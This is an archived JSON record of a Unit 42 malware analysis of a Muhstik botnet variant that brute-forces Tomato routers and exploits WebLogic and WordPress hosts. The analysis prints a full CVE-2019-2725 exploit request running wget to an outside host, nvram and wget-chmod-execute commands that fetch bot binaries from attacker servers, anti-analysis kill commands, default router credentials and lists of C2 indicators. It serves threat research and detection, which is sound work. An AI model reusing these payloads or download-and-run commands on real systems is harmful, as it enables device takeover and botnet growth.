{
    "id": "2854ed0c-5ed0-4428-bf0d-07a4df950213",
    "created_at": "2023-01-12T15:06:33.759617Z",
    "updated_at": "2025-03-27T02:06:10.621364Z",
    "deleted_at": null,
    "sha1_hash": "3798cd6afb329268d3573230307926aaecaba5e3",
    "title": "2020-01-21 - Muhstik Botnet Attacks Tomato Routers to Harvest New IoT Devices",
    "authors": "",
    "file_creation_date": "2022-05-29T10:47:59Z",
    "file_modification_date": "2022-05-29T10:47:59Z",
    "file_size": 2162512,
    "plain_text": "# Muhstik Botnet Attacks Tomato Routers to Harvest New IoT Devices\n\n**[unit42.paloaltonetworks.com/muhstik-botnet-attacks-tomato-routers-to-harvest-new-iot-devices/](https://unit42.paloaltonetworks.com/muhstik-botnet-attacks-tomato-routers-to-harvest-new-iot-devices/)**\n\nCong Zheng, Yang Ji, Asher Davila January 21, 2020\n\nBy [Cong Zheng,](https://unit42.paloaltonetworks.com/author/cong-zheng/) [Yang Ji and](https://unit42.paloaltonetworks.com/author/yang-ji/) [Asher Davila](https://unit42.paloaltonetworks.com/author/asher-davila/)\n\nJanuary 21, 2020 at 6:00 AM\n\n[Category: Unit 42](https://unit42.paloaltonetworks.com/category/unit-42/)\n\nTags: [botnet,](https://unit42.paloaltonetworks.com/tag/botnet/) [IoT,](https://unit42.paloaltonetworks.com/tag/iot/) [IoT Attacks,](https://unit42.paloaltonetworks.com/tag/iot-attacks/) [Muhstik,](https://unit42.paloaltonetworks.com/tag/muhstik/) [Tomato](https://unit42.paloaltonetworks.com/tag/tomato/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/muhstik-botnet-attacks-tomato-routers-to-harvest-new-iot-devices/)\n\n## Executive Summary\n\nOn Dec. 5, 2019, Unit 42 researchers discovered a new variant of the Muhstik botnet that adds a scanner\nto now attack Tomato routers for the first time by web authentication brute forcing.\n\n[Tomato is an open source alternative firmware for routers. Thanks to its stable, Linux-based, non-](https://advancedtomato.com/)\nproprietary firmware, with VPN-passthrough capability and advanced quality of service (QoS) control,\nTomato firmware is commonly installed by multiple router vendors and also installed manually by end\nusers. By our investigation on Shodan, there are more than 4,600 Tomato routers exposed on the\nInternet.\n\nThe Muhstik botnet has been alive since March 2018, with a wormlike self-propagating capability to infect\nLinux servers and IoT devices. Muhstik uses multiple vulnerability exploits to infect Linux services, such\nas [Weblogic, WordPress and Drupal. It also compromises IoT routers, such as the GPON home router](https://unit42.paloaltonetworks.com/muhstik-botnet-exploits-the-latest-weblogic-vulnerability-for-cryptomining-and-ddos-attacks/)\n\n\n-----\n\n[and DD-WRT router. This new variant expands the botnet by infecting Tomato routers.](https://blog.netlab.360.com/gpon-exploit-in-the-wild-i-muhstik-botnet-among-others-en/)\n\nWe have not found further malicious activities in Tomato routers after the Muhstik botnet harvests\nvulnerable routers, but from our understanding of the Muhstik botnet, Muhstik mainly launches\ncryptocurrency mining and DDoS attacks in IoT bots to earn profit. We will keep monitoring its Command\nand Control (C2) IRC channel.\n\nIn the following part, we have a detailed analysis of Muhstik botnet.\n\n### New Scanner for Tomato Routers\n\nThe new Muhstik variant scans Tomato routers on TCP port 8080 and bypasses the admin web\nauthentication by default credentials bruteforcing. In Tomato routers, the default credentials are\n“admin:admin” and “root:admin”. We captured the Tomato router web authentication brute forcing traffic, in\nFigure 1.\n\n_Figure 1. Tomato router web authentication bruteforcing_\n\nTo estimate the infected volume, we searched for fingerprints of Tomato routers in Shodan. As noted in\nFigure 2, there are about 4,600 potential victims on the Internet in total. This total is derived by including\nthe number of TomatoUSB devices, which is used as a NAS server by combining the Tomato router and a\nUSB drive.\n\n\n-----\n\n_Figure 2. Exposed Tomato & TomatoUSB routers on the Internet_\n\n### Other Scanners\n\n**Scan #1: WordPress**\n\nThe first module is a scanner to identify WordPress installed on a server. To perform the scanning, it\nsends a GET request to port 80/tcp or 8080/tcp, which are typical HTTP ports.\n\n\n-----\n\n_Figure 3. WordPress scanner used by daymon_\n\n**Scan #2: Webuzo**\n\nThe second module is a scanner to identify Webuzo solutions installed on a server. To accomplish the\nscanning, it sends a GET request to port 2004/tcp, which is Webuzo’s default port for administration. The\nrequest uses the path /install.php since it is the Webuzo installer file and by default a server running\nWebuzo will respond successfully to that request.\n\n\n1\n2\n3\n4\n\n\nGET /install.php HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36\n(KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\nHost: 132.223.202.213\n\n\n**Scan #3: CVE-2019-2725 - WebLogic versions 10.3.6.0 and 12.1.3.0**\n\n\n-----\n\nThe third module abuses a deserialization vulnerability present in Oracle WebLogic Server that leads to a\nRemote Code Execution. This vulnerability can be exploited remotely and without previous authentication.\nThis exploit is sent to port 7001/tcp since its WebLogic Server’s default port.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nPOST /_async/AsyncResponseService HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36\n(KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\nHost: 194.187.209.4\nContent-Type: text/xml\ncontent-length: 916\n\n<soapenv:Envelope\nxmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/'\nxmlns:wsa='http://www.w3.org/2005/08/addressing'\nxmlns:asy='http://www.bea.com/async/AsyncResponseService'><soapenv:Head\ner>\n<wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkC\nontext xmlns:work='http://bea.com/2004/06/soap/workarea/'><java\nversion='1.4.0' class='java.beans.XMLDecoder'> <void\nclass='java.lang.ProcessBuilder'> <array class='java.lang.String'\nlength='3'> <void index='0'> <string>/bin/bash</string> </void> <void\nindex='1'> <string>-c</string> </void> <void index='2'> <string>wget\nhttp://165.227.78.159/wl.php</string> </void> </array> <void\nmethod='start'/></void> </java>\n</work:WorkContext\n></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>\n\n\nWe think that this URL hxxp://165.227.78[.]159/wl.php is used for the reporting purpose. Because, the\n[same IP address 165.227.78[.]159 was previously used by Mushtik botnet as a reporting server to collect](https://blog.netlab.360.com/gpon-exploit-in-the-wild-i-muhstik-botnet-among-others-en/)\n[information of bots as we mentioned in a previous analysis of another Muhstik variant.](https://unit42.paloaltonetworks.com/muhstik-botnet-exploits-the-latest-weblogic-vulnerability-for-cryptomining-and-ddos-attacks/)\n\n### Muhstik Botnet Infrastructure\n\nFigure 3 below shows the execution flow used by the updated Muhstik variant. Figure 4 shows this\nMuhstik botnet variant combining the modules to scan Linux servers running WordPress and Webuzo.\nAdditionally, it implements modules to compromise WebLogic servers and Wi-Fi routers running Tomato\nfirmware.\n\n\n-----\n\n_Figure 4. Muhstik infrastructure_\n\n_Figure 5. Detailed scanning and exploiting behavior_\n\n## Payloads of Muhstik Variants\n\nWe discovered a malicious binary called tty0. Since tty0 targets Tomato routers, it includes bash\ncommands that can be executed in those systems (and other systems such as DD-WRT):\n\n\n-----\n\nThe first command is used to download a binary called nvr from http://y.fd6fq54s6df541q23sdxfg[.]eu/nvr\n\n\n1\n2\n3\n4\n\n\n/bin/sh -c nvram set rc_firewall=\"sleep 120 && wget -qO http://y.fd6fq54s6df541q23sdxfg.eu/nvr | sh\" > /dev/null 2>&1\n\n/bin/sh -c nvram commit &gt; /dev/null 2&gt;&amp;1\n\n\nIt also applies anti-analysis techniques by killing the strace and tcpdump process running in the system.\n\n\n1\n2\n3\n4\n\n\n/usr/bin/killall -9 strace\n/bin/sh -c killall -9 tcpdump > /dev/null 2>&1 &\n/bin/sh -c killall -9 strace > /dev/null 2>&1 &\n/usr/bin/killall -9 tcpdump\n\n\nThe nvr binary contains commands to download four additional binaries. These four binaries are IRC\nbotnet variants, which work on ARM and MIPS architectures. We focused our analysis on binary Pty5,\nsince it drops a binary called daymon, which is a scanner containing the new module targeting Tomato\nrouters.\n\ndaymon was encrypted using Mirai’s encryption method, the table key is 0xEFBEADDE.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nwget -O /tmp/pty1 http://159.89.156.190/.y/pty1; chmod +x\n/tmp/pty1; chmod 700 /tmp/pty1; /tmp/pty1 &\n\nwget -O /tmp/pty3 http://159.89.156.190/.y/pty3; chmod +x\n/tmp/pty3; chmod 700 /tmp/pty3; /tmp/pty3 &\n\nwget -O /tmp/pty6 http://159.89.156.190/.y/pty6; chmod +x\n/tmp/pty6; chmod 700 /tmp/pty6; /tmp/pty6 &\n\nwget -O /tmp/pty5 http://159.89.156.190/.y/pty5; chmod +x\n/tmp/pty5; chmod 700 /tmp/pty5; /tmp/pty5 &\n\n\n### IRC C2\n\nOnce a device is compromised, it will send a connect command to an IRC server. The connect command\nincludes a nickname (NICK) for the device in order to join the channel. This nickname contains the node\nhostname of the infected device that was previously obtained, shown in Figure 5.\n\n_Figure 6. Hostname harvesting_\n\nIn Figure 6, it adds a username to the connect command.\n\n1 USER muhstik localhost localhost :muhstik-11052018\n\n\n-----\n\nThe server responds with a PING command followed by a BotnetID. The infected device replies with a\nPONG followed by the BotnetID. Once a nickname has been crafted and assigned to the infected client,\nthe IRC server accepts the bot as a client in the main channel. Then, the server sends a MOTD (Message\nof the Day) to the client. Consequently, the victim device will send a command to join a channel called ea,\nwhere the commands are sent to the clients that have joined the botnet. The botnet will harvest\ninformation of the infected device such as the public IP address in order to register the device into the\nbotnet.\n\n_Figure 7. Joining the IRC channel_\n\n## Conclusion\n\nThe new Muhstik botnet variant demonstrates that IoT botnet keeps expanding the botnet size by adding\nnew scanners and exploits to harvest new IoT devices. Botnet developers are increasingly compromising\nIoT devices installed with the open source firmware, which often lack the security updates and\nmaintenance patches necessary to keep devices safeguarded. End users should be cautious when\ninstalling open source firmware and must follow the security guidelines in the firmware manual.\n\nPalo Alto Networks customers are protected from the Muhstik botnet by the following platform protections:\n\n1. Threat Prevention Signatures: 55570 that identifies the Weblogic (CVE-2019-2725) exploit.\n2. PAN-DB and DNS Security: blocks attackers’ C2 server URL and domain.\n3. WildFire and Antivirus: identifies and blocks Muhstik malware.\n\n## Appendix\n\n### C2\n\n**IRC servers:**\n\n\n-----\n\n46.149.233[.]35\n\n68.66.253[.]100\n\n185.61.149[.]22\n\n**Domains and URLs:**\n\nhxxp://y.fd6fq54s6df541q23sdxfg[.]eu/nvr\n\nhxxp://159.89.156[.]190/.y/pty1\n\nhxxp://159.89.156[.]190/.y/pty3\n\nhxxp://159.89.156[.]190/.y/pty5\n\nhxxp://159.89.156[.]190/.y/pty6\n\ns.shadow.mods[.]net\n\n**Samples**\n\n**Filename** **SHA256** **File type**\n\ntty0 492780a9ac9f03305538b360d8a836c038da4920e8c1ae620988b120613c0b1f MIPS-ELF\n\nnvr 2548f5b1613f6ebba2ff589c7b3416ccdd066b73644d4d212232beb1cecd9c31 Shell\nscript\n\nPty1 a4ba50129408f9f52ddabe5bfd5bfb46aea0ca48fb616f495f2610b2f1729687 MIPS-ELF\n\nPty3 7325742dc0d939542d4c04ae2ae8f2792711203de50d3d16de3a9f83baaf5435 MIPS-ELF\n\nPty5 72123c51bcdf8c1784654d9e2470e69131872407408aa3cf775ea0ace87bb9a0 ARM-ELF\n\nPty6 cee20e79f20d35b95645f0cbda1897302e6e554c50f3e6754ce9293e3c1ba11c ARM-ELF\n\ndaymon dc52a1193ecf6096192f771ae663de6e0389840cb5ceb7b979091333ce6f7f02 ARM-ELF\n\n**Get updates from**\n\n**Palo Alto**\n\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-01-21 - Muhstik Botnet Attacks Tomato Routers to Harvest New IoT Devices.pdf"
    ],
    "report_names": [
        "2020-01-21 - Muhstik Botnet Attacks Tomato Routers to Harvest New IoT Devices.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535993,
    "ts_updated_at": 1743041170,
    "ts_creation_date": 1653821279,
    "ts_modification_date": 1653821279,
    "files": {
        "pdf": "https://archive.orkl.eu/3798cd6afb329268d3573230307926aaecaba5e3.pdf",
        "text": "https://archive.orkl.eu/3798cd6afb329268d3573230307926aaecaba5e3.txt",
        "img": "https://archive.orkl.eu/3798cd6afb329268d3573230307926aaecaba5e3.jpg"
    }
}